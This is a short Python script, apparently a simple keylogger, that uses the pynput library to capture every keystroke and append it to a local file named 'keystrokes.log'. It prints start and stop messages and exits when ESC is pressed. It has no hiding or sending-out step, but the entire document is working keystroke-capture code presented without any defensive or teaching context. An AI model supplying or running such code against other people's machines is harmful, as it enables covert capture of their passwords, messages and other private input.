from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        # Check for exit key first
        if key == Key.esc:
            print("\nKeylogger stopped")
            return False  # Stop the listener

        # Try to get character from regular key
        char = key.char
        
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            char = ' '
        elif key == Key.enter:
            char = '\n'
        elif key == Key.tab:
            char = '\t'
        elif key == Key.backspace:
            char = '[BACKSPACE]'
        else:
            # Format other special keys
            char = f'[{key.name}]'

    # Log the keystroke
    with open('keystrokes.log', 'a', encoding='utf-8') as f:
        f.write(char)

print("Keylogger started. Press ESC to exit.")
with Listener(on_press=on_press) as listener:
    listener.join()